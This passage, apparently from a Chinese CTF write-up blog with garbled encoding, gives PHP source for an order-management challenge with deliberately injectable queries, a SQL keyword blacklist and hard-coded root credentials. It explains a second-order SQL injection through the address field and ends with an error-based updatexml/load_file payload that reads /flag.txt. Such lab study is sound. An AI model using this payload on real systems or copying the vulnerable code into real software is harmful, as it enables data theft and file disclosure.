<span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;å§“å:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, åœ°å€:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;æœç´¢&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;è®¢å•æŸ¥è¯¢&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;å§“å:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;ç”µè¯:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;æŸ¥è¯¢è®¢å•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;è®¢å•ç®¡ç†&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;è¿”å›&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;    </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;è®¢å•åˆ é™¤æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;åˆ é™¤è®¢å•&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;åˆ é™¤è®¢å•&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;å§“å:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;ç”µè¯:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;åˆ é™¤è®¢å•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot; <span class="title">style</span>=&quot;<span class="title">color</span>:#<span class="title">ffffff</span>;&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;è®¢å•ç®¡ç†&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;è¿”å›&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»£ç å®¡è®¡å¯ä»¥å‘ç°ï¼Œuser_nameå’Œphoneéƒ½è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä½†æ˜¯addressåªç”¨addslashes()å¯¹é¢„å®šä¹‰å­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œæ‰€ä»¥addresså‚æ•°ä¸ºå¯ä»¥åˆ©ç”¨çš„æ³¨å…¥ç‚¹</p><p>ç”±äºaddressè¢«addslashes()è½¬ä¹‰ä»¥åå•å¼•å·ç­‰æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯æ›´æ–°åœ°å€æ—¶ï¼Œä¼šå°†æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å°†åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹åœ°å€æ—¶è¾“å…¥SQLæ³¨å…¥è¯­å¥ï¼Œåœ¨ç¬¬äºŒæ¬¡æ›´æ–°æ—¶ï¼ˆéšä¾¿è¾“ï¼‰ï¼Œç¬¬ä¸€æ¬¡æ›´æ–°çš„SQLè¯­å¥ä¼šè¢«è°ƒç”¨ä»è€Œå¼•å‘äºŒæ¬¡æ³¨å…¥ã€‚</p><p><img src="../images/image-20230507213726053.png" alt="image-20230507213726053"></p><p>å› ä¸ºæŠ¥é”™æ³¨å…¥æœ€é•¿è¾“å‡º32ä½æ‰€ä»¥åˆ†ä¸¤æ¬¡è¯»å–ã€‚</p><p>å…ˆå»æäº¤è®¢å•</p><p><img src="../images/image-20230507214302818.png" alt="image-20230507214302818"></p><p>è¿™æ ·çš„è¯åœ°å€å’Œå§“åç”µè¯å°±ä¼šå­˜åœ¨æ•°æ®åº“é‡Œ</p><p><img src="../images/image-20230507214334374.png" alt="image-20230507214334374"></p><p>æ ¹æ®è¿™æ®µä»£ç ï¼Œåœ¨ä¸‹æ¬¡è¿›è¡Œåœ°å€çš„ä¿®æ”¹çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œold_addressé‡Œé¢æˆ‘ä»¬ä¹‹å‰å­˜æ”¾çš„ä»£ç </p><p>ç„¶åå°±ä¼šè¾“å‡ºflagäº†</p><p><img src="../images/image-20230507214513864.png" alt="image-20230507214513864"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æŸ¥è¯¢åé¢çš„å­—æ®µåŒç†</p>]]></content>
      
      
      
        <tags>
            
            <tag> buuctf åˆ·é¢˜è®°å½• ç¬¬ä¸‰é¡µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC3</title>
      <link href="/posts/a127ea96.html"/>
      <url>/posts/a127ea96.html</url>
      
